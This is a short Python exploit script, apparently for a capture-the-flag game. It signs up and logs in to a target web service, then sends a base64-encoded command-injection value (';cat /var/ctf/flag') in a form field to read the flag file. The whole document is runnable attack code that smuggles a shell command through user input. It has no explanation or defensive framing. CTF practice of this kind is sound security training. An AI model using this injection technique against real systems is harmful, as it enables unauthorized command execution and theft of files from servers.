#!/usr/bin/env python
import requests
import time

from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from sys import argv


HOST, PORT = (None, None)  # ("localhost", 8000)
url = None
mycmd = ";cat /var/ctf/flag".encode('base64').strip()


def join(uname, pw):
    data = {'username': uname, 'password': pw}
    r = requests.post(url + 'join.py', data=data)
    return r.text

def login(s, uname, pw):
    data = {'username': uname, 'password': pw}
    r = s.post(url + 'login.py', data=data)
    return r.text

def req(s):
    data = {'dir': mycmd}
    r = s.post(url + 'warmup.py', data=data)
    return r.text

def exploit():
    join('asdf', 'asdf')
    s = requests.session()
    s.get(url)
    login(s, 'asdf', 'asdf')
    txt = req(s)
    flag = txt.split('</pre>')[0].split()[-1]
    print flag

if __name__ == '__main__':
    time.sleep(2)
    HOST = argv[1]
    PORT = int(argv[2])
    url = "http://{}:{}/".format(HOST, PORT)
    exploit()
